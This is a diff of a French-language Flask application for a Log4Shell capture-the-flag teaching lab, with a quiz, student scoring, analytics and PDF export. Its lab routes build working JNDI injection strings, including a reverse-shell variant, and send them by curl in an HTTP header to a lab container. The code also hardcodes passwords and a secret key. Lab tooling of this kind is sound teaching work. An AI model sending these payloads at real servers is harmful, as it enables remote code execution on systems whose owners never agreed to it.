@@ -11,6 +11,12 @@ import io
 app = Flask(__name__)
 app.secret_key = 'log4shell_ctf_secret_key_2026'
 
+# ── Configuration via variables d'environnement ───────────────────────
+VULNERABLE_HOST = os.environ.get('VULNERABLE_HOST', 'vulnerable')
+VULNERABLE_PORT = os.environ.get('VULNERABLE_PORT', '8080')
+LDAP_HOST       = os.environ.get('LDAP_HOST', 'ldap')
+LDAP_PORT       = os.environ.get('LDAP_PORT', '1389')
+
 # Flask-Login setup
 login_manager = LoginManager()
 login_manager.init_app(app)
@@ -18,8 +24,8 @@ login_manager.login_view = 'login'
 
 # Base de données utilisateurs
 users_db = {
-    'student': {'password': 'student123', 'role': 'student', 'name': 'Étudiant'},
-    'professor': {'password': 'prof123', 'role': 'professor', 'name': 'Professeur'}
+    'student':   {'password': 'student123', 'role': 'student',    'name': 'Étudiant'},
+    'professor': {'password': 'prof123',    'role': 'professor',   'name': 'Professeur'}
 }
 
 # Base de données Quiz
@@ -42,7 +48,7 @@ quiz_questions = [
             'Java Network Directory Integration'
         ],
         'correct': 1,
-        'explanation': 'JNDI signifie Java Naming and Directory Interface, une API Java pour accéder à des services de nommage et d\'annuaire.',
+        'explanation': "JNDI signifie Java Naming and Directory Interface, une API Java pour accéder à des services de nommage et d'annuaire.",
         'points': 10
     },
     {
@@ -60,7 +66,7 @@ quiz_questions = [
     },
     {
         'id': 4,
-        'question': 'Quel type de serveur est utilisé dans l\'exploitation Log4Shell?',
+        'question': "Quel type de serveur est utilisé dans l'exploitation Log4Shell?",
         'options': ['HTTP', 'LDAP', 'FTP', 'SSH'],
         'correct': 1,
         'explanation': 'Un serveur LDAP malveillant est utilisé pour rediriger vers le payload Java.',
@@ -79,12 +85,12 @@ quiz_questions = [
         'question': 'Quel header HTTP est couramment utilisé pour injecter le payload?',
         'options': ['Content-Type', 'User-Agent', 'Accept', 'Host'],
         'correct': 1,
-        'explanation': 'Le header User-Agent est souvent loggé et donc un vecteur d\'injection courant.',
+        'explanation': 'Le header User-Agent est souvent loggé et donc un vecteur injection courant.',
         'points': 10
     },
     {
         'id': 7,
-        'question': 'Que permet d\'obtenir Log4Shell?',
+        'question': "Que permet d'obtenir Log4Shell?",
         'options': [
             'Lecture de fichiers',
             'Déni de service',
@@ -92,7 +98,7 @@ quiz_questions = [
             'Injection SQL'
         ],
         'correct': 2,
-        'explanation': 'Log4Shell permet l\'exécution de code arbitraire à distance (Remote Code Execution).',
+        'explanation': "Log4Shell permet l'exécution de code arbitraire à distance (Remote Code Execution).",
         'points': 15
     },
     {
@@ -129,16 +135,16 @@ quiz_questions = [
 # Stockage des sessions
 user_sessions = {}
 attack_analytics = {
-    'total_attacks': 0,
+    'total_attacks':      0,
     'successful_attacks': 0,
-    'failed_attacks': 0,
-    'total_shells': 0
+    'failed_attacks':     0,
+    'total_shells':       0
 }
 attack_log = []
 
 class User(UserMixin):
     def __init__(self, username, role, name):
-        self.id = username
+        self.id   = username
         self.role = role
         self.name = name
 
@@ -153,43 +159,44 @@ def log_user_action(action, details=''):
         username = current_user.id
         if username in user_sessions:
             user_sessions[username]['actions'].append({
-                'time': datetime.now().strftime('%H:%M:%S'),
-                'action': action,
+                'time':    datetime.now().strftime('%H:%M:%S'),
+                'action':  action,
                 'details': details
             })
 
-# Routes d'authentification
+# ── Routes d'authentification ─────────────────────────────────────────
+
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
-        data = request.json
+        data     = request.json
         username = data.get('username')
         password = data.get('password')
-        
+
         if username in users_db and users_db[username]['password'] == password:
             user = User(username, users_db[username]['role'], users_db[username]['name'])
             login_user(user)
-            
+
             if username not in user_sessions:
                 user_sessions[username] = {
-                    'start_time': datetime.now(),
-                    'actions': [],
-                    'score': 0,
-                    'attacks': 0,
-                    'success': 0,
-                    'quiz_score': 0,
-                    'quiz_attempts': 0,
-                    'quiz_completed': []
+                    'start_time':      datetime.now(),
+                    'actions':         [],
+                    'score':           0,
+                    'attacks':         0,
+                    'success':         0,
+                    'quiz_score':      0,
+                    'quiz_attempts':   0,
+                    'quiz_completed':  []
                 }
-            
+
             return jsonify({
-                'status': 'success',
-                'role': user.role,
+                'status':   'success',
+                'role':     user.role,
                 'redirect': '/professor' if user.role == 'professor' else '/dashboard'
             })
-        
+
         return jsonify({'status': 'error', 'message': 'Identifiants invalides'})
-    
+
     return render_template('login.html')
 
 @app.route('/logout')
@@ -232,22 +239,21 @@ def professor_dashboard():
         return redirect(url_for('dashboard'))
     return render_template('professor.html', user=current_user)
 
-# API Quiz
+# ── API Quiz ──────────────────────────────────────────────────────────
+
 @app.route('/api/quiz/questions')
 @login_required
 def get_quiz_questions():
     if current_user.role != 'student':
         return jsonify({'status': 'error', 'message': 'Accès refusé'})
-    
-    questions = []
-    for q in quiz_questions:
-        questions.append({
-            'id': q['id'],
-            'question': q['question'],
-            'options': q['options'],
-            'points': q['points']
-        })
-    
+
+    questions = [{
+        'id':       q['id'],
+        'question': q['question'],
+        'options':  q['options'],
+        'points':   q['points']
+    } for q in quiz_questions]
+
     return jsonify({'status': 'success', 'questions': questions})
 
 @app.route('/api/quiz/submit', methods=['POST'])
@@ -255,50 +261,48 @@ def get_quiz_questions():
 def submit_quiz():
     if current_user.role != 'student':
         return jsonify({'status': 'error', 'message': 'Accès refusé'})
-    
-    data = request.json
-    answers = data.get('answers', {})
-    
-    score = 0
+
+    data        = request.json
+    answers     = data.get('answers', {})
+    score       = 0
     total_points = 0
-    results = []
-    
+    results     = []
+
     for q in quiz_questions:
         total_points += q['points']
-        user_answer = int(answers.get(str(q['id']), -1))
-        is_correct = user_answer == q['correct']
-        
+        user_answer   = int(answers.get(str(q['id']), -1))
+        is_correct    = user_answer == q['correct']
         if is_correct:
             score += q['points']
-        
+
         results.append({
-            'id': q['id'],
-            'question': q['question'],
-            'user_answer': user_answer,
+            'id':             q['id'],
+            'question':       q['question'],
+            'user_answer':    user_answer,
             'correct_answer': q['correct'],
-            'is_correct': is_correct,
-            'explanation': q['explanation'],
-            'points': q['points'] if is_correct else 0
+            'is_correct':     is_correct,
+            'explanation':    q['explanation'],
+            'points':         q['points'] if is_correct else 0
         })
-    
+
     if current_user.id in user_sessions:
-        user_sessions[current_user.id]['quiz_score'] = score
-        user_sessions[current_user.id]['score'] += score
+        user_sessions[current_user.id]['quiz_score']    = score
+        user_sessions[current_user.id]['score']        += score
         user_sessions[current_user.id]['quiz_attempts'] += 1
         user_sessions[current_user.id]['quiz_completed'].append({
-            'time': datetime.now().strftime('%H:%M:%S'),
+            'time':  datetime.now().strftime('%H:%M:%S'),
             'score': score,
             'total': total_points
         })
-    
+
     log_user_action('quiz_completed', f'Score: {score}/{total_points}')
-    
+
     return jsonify({
-        'status': 'success',
-        'score': score,
-        'total': total_points,
+        'status':     'success',
+        'score':      score,
+        'total':      total_points,
         'percentage': round((score / total_points) * 100, 2),
-        'results': results
+        'results':    results
     })
 
 @app.route('/api/quiz/stats')
@@ -306,13 +310,14 @@ def submit_quiz():
 def get_quiz_stats():
     if current_user.id in user_sessions:
         return jsonify({
-            'status': 'success',
+            'status':     'success',
             'quiz_score': user_sessions[current_user.id].get('quiz_score', 0),
-            'attempts': user_sessions[current_user.id].get('quiz_attempts', 0)
+            'attempts':   user_sessions[current_user.id].get('quiz_attempts', 0)
         })
     return jsonify({'status': 'success', 'quiz_score': 0, 'attempts': 0})
 
-# API Analytics
+# ── API Analytics ─────────────────────────────────────────────────────
+
 @app.route('/api/analytics/global')
 @login_required
 def get_global_analytics():
@@ -323,23 +328,23 @@ def get_global_analytics():
 def get_student_analytics():
     if current_user.role != 'professor':
         return jsonify({'status': 'error', 'message': 'Accès refusé'})
-    
+
     students_data = []
     for username, session_data in user_sessions.items():
         if username != 'professor':
             user = users_db.get(username, {})
             students_data.append({
-                'username': username,
-                'name': user.get('name', username),
-                'score': session_data.get('score', 0),
-                'attacks': session_data.get('attacks', 0),
-                'success': session_data.get('success', 0),
-                'quiz_score': session_data.get('quiz_score', 0),
-                'quiz_attempts': session_data.get('quiz_attempts', 0),
-                'time_spent': str(datetime.now() - session_data.get('start_time', datetime.now())),
-                'last_action': session_data.get('actions', [])[-1]['action'] if session_data.get('actions') else 'Aucune'
+                'username':       username,
+                'name':           user.get('name', username),
+                'score':          session_data.get('score', 0),
+                'attacks':        session_data.get('attacks', 0),
+                'success':        session_data.get('success', 0),
+                'quiz_score':     session_data.get('quiz_score', 0),
+                'quiz_attempts':  session_data.get('quiz_attempts', 0),
+                'time_spent':     str(datetime.now() - session_data.get('start_time', datetime.now())),
+                'last_action':    session_data.get('actions', [])[-1]['action'] if session_data.get('actions') else 'Aucune'
             })
-    
+
     return jsonify({'status': 'success', 'students': students_data})
 
 @app.route('/api/analytics/export', methods=['POST'])
@@ -347,22 +352,22 @@ def get_student_analytics():
 def export_analytics():
     if current_user.role != 'professor':
         return jsonify({'status': 'error', 'message': 'Accès refusé'})
-    
+
     buffer = io.BytesIO()
-    p = canvas.Canvas(buffer, pagesize=letter)
+    p      = canvas.Canvas(buffer, pagesize=letter)
     width, height = letter
-    
+
     p.setFont("Helvetica-Bold", 24)
     p.drawString(100, height - 100, "Log4Shell CTF Lab - Rapport")
-    
+
     p.setFont("Helvetica", 12)
     p.drawString(100, height - 130, f"Date: {datetime.now().strftime('%d/%m/%Y %H:%M')}")
-    
+
     y = height - 180
     p.setFont("Helvetica-Bold", 16)
     p.drawString(100, y, "Statistiques Globales")
     y -= 30
-    
+
     p.setFont("Helvetica", 12)
     p.drawString(120, y, f"Total attaques: {attack_analytics['total_attacks']}")
     y -= 20
@@ -370,163 +375,95 @@ def export_analytics():
     y -= 20
     p.drawString(120, y, f"Shells obtenus: {attack_analytics['total_shells']}")
     y -= 40
-    
+
     p.setFont("Helvetica-Bold", 16)
     p.drawString(100, y, "Étudiants")
     y -= 30
-    
+
     p.setFont("Helvetica", 10)
     for username, session_data in user_sessions.items():
         if username != 'professor' and y > 100:
             p.drawString(120, y, f"{username}: Score {session_data.get('score', 0)} | Quiz: {session_data.get('quiz_score', 0)}")
             y -= 20
-    
+
     p.showPage()
     p.save()
     buffer.seek(0)
-    
+
     return send_file(buffer, as_attachment=True, download_name='log4shell_report.pdf', mimetype='application/pdf')
 
-# API Lab
+# ── API Lab ───────────────────────────────────────────────────────────
+
 @app.route('/api/status')
 @login_required
 def status():
     try:
-        result = subprocess.run(['docker', 'ps', '--format', '{{.Names}}\t{{.Status}}'], 
-                              capture_output=True, text=True)
+        result = subprocess.run(
+            ['docker', 'ps', '--format', '{{.Names}}\t{{.Status}}'],
+            capture_output=True, text=True
+        )
         containers = []
         for line in result.stdout.strip().split('\n'):
             if 'log4shell' in line:
                 parts = line.split('\t')
                 containers.append({'name': parts[0], 'status': parts[1]})
-        
+
         log_user_action('check_status')
         return jsonify({'status': 'success', 'containers': containers})
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)})
-
-@app.route('/api/start-containers', methods=['POST'])
-@login_required
-def start_containers():
-    try:
-        os.chdir('/home/farahrex/log4shell-dockerlab-main')
-        subprocess.Popen(['docker-compose', 'up', '-d'])
-        time.sleep(5)
-        
-        if current_user.id in user_sessions:
-            user_sessions[current_user.id]['score'] += 10
-        
-        log_user_action('start_containers')
-        return jsonify({'status': 'success', 'message': 'Containers démarrés (+10 points)'})
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)})
-
-@app.route('/api/stop-containers', methods=['POST'])
-@login_required
-def stop_containers():
-    try:
-        os.chdir('/home/farahrex/log4shell-dockerlab-main')
-        subprocess.run(['docker-compose', 'down'])
-        log_user_action('stop_containers')
-        return jsonify({'status': 'success', 'message': 'Containers arrêtés'})
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)})
 
 @app.route('/api/generate-payload', methods=['POST'])
 @login_required
 def generate_payload():
-    data = request.json
+    data         = request.json
     payload_type = data.get('type', 'simple')
-    attacker_ip = data.get('ip', '192.168.126.131')
-    
+
     payloads = {
-        'simple': f'${{jndi:ldap://{attacker_ip}:1389/Exploit}}',
-        'reverse_shell': f'${{jndi:ldap://{attacker_ip}:1389/Rev}}'
+        'simple':        f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT}/Exploit}}',
+        'reverse_shell': f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT}/Rev}}'
     }
-    
+
     log_user_action('generate_payload')
     return jsonify({
-        'status': 'success',
+        'status':  'success',
         'payload': payloads.get(payload_type, payloads['simple'])
     })
 
 @app.route('/api/launch-attack', methods=['POST'])
 @login_required
 def launch_attack():
-    data = request.json
-    target = data.get('target', '192.168.126.131:8080')
-    payload = data.get('payload', '${jndi:ldap://192.168.126.131:1389/Rev}')
-    
+    data    = request.json
+    # Utiliser les variables d'environnement — ignorer les valeurs envoyées par le client
+    target  = f"{VULNERABLE_HOST}:{VULNERABLE_PORT}"
+    payload = data.get('payload', f'${{jndi:ldap://{LDAP_HOST}:{LDAP_PORT}/Exploit}}')
+
     try:
         result = subprocess.run([
             'curl', f'http://{target}',
             '-H', f'X-Api-Version: {payload}'
         ], capture_output=True, text=True, timeout=5)
-        
-        attack_analytics['total_attacks'] += 1
+
+        attack_analytics['total_attacks']      += 1
         attack_analytics['successful_attacks'] += 1
-        attack_analytics['total_shells'] += 1
-        
+        attack_analytics['total_shells']       += 1
+
         if current_user.id in user_sessions:
             user_sessions[current_user.id]['attacks'] += 1
-            user_sessions[current_user.id]['score'] += 50
+            user_sessions[current_user.id]['score']   += 50
             user_sessions[current_user.id]['success'] += 1
-        
+
         attack_log.append({
-            'time': datetime.now().strftime('%H:%M:%S'),
-            'user': current_user.name,
-            'target': target,
+            'time':    datetime.now().strftime('%H:%M:%S'),
+            'user':    current_user.name,
+            'target':  target,
             'payload': payload
         })
-        
+
         log_user_action('launch_attack')
         return jsonify({'status': 'success', 'message': 'Attaque lancée (+50 points)'})
     except Exception as e:
         attack_analytics['failed_attacks'] += 1
-        return jsonify({'status': 'error', 'message': str(e)})
-
-@app.route('/api/compile-payload', methods=['POST'])
-@login_required
-def compile_payload():
-    data = request.json
-    java_code = data.get('code', '')
-    
-    try:
-        with open('/home/farahrex/log4shell-dockerlab-main/attacker-webserver/Rev.java', 'w') as f:
-            f.write(java_code)
-        
-        result = subprocess.run([
-            'javac', '--release', '8', 
-            '/home/farahrex/log4shell-dockerlab-main/attacker-webserver/Rev.java'
-        ], capture_output=True, text=True)
-        
-        if result.returncode == 0:
-            if current_user.id in user_sessions:
-                user_sessions[current_user.id]['score'] += 20
-            
-            log_user_action('compile_payload')
-            return jsonify({'status': 'success', 'message': 'Payload compilé (+20 points)'})
-        else:
-            return jsonify({'status': 'error', 'message': result.stderr})
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)})
-
-@app.route('/api/start-webserver', methods=['POST'])
-@login_required
-def start_webserver():
-    try:
-        result = subprocess.run(['lsof', '-ti:8888'], capture_output=True, text=True)
-        if result.stdout.strip():
-            return jsonify({'status': 'success', 'message': 'Serveur web déjà actif'})
-        
-        os.chdir('/home/farahrex/log4shell-dockerlab-main/attacker-webserver')
-        subprocess.Popen(['python3', '-m', 'http.server', '8888'], 
-                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(1)
-        
-        log_user_action('start_webserver')
-        return jsonify({'status': 'success', 'message': 'Serveur web démarré'})
-    except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)})
 
 @app.route('/api/attack-log')
@@ -540,13 +477,13 @@ def get_user_score():
     if current_user.id in user_sessions:
         session_data = user_sessions[current_user.id]
         return jsonify({
-            'status': 'success',
-            'score': session_data.get('score', 0),
-            'attacks': session_data.get('attacks', 0),
-            'success': session_data.get('success', 0),
+            'status':     'success',
+            'score':      session_data.get('score', 0),
+            'attacks':    session_data.get('attacks', 0),
+            'success':    session_data.get('success', 0),
             'quiz_score': session_data.get('quiz_score', 0)
         })
     return jsonify({'status': 'success', 'score': 0, 'attacks': 0, 'success': 0, 'quiz_score': 0})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=5000, debug=False)
